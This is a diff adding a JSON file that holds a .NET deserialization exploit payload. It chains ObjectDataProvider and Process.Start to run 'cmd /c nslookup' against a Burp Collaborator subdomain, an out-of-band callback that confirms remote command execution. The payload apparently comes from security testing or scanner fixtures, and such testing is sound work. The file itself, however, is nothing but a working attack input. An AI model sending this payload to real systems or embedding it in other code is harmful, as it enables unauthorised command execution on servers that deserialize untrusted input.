@@ -1,0 +1,11 @@
+{
+    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
+    'MethodName':'Start',
+    'ObjectInstance':{
+        '__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+        'StartInfo': {
+            '__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+            'FileName':'cmd', 'Arguments':'/c nslookup g8pn57c8lninky4b71gdlhw5awgn4c.burpcollaborator.net'
+        }
+    }
+}
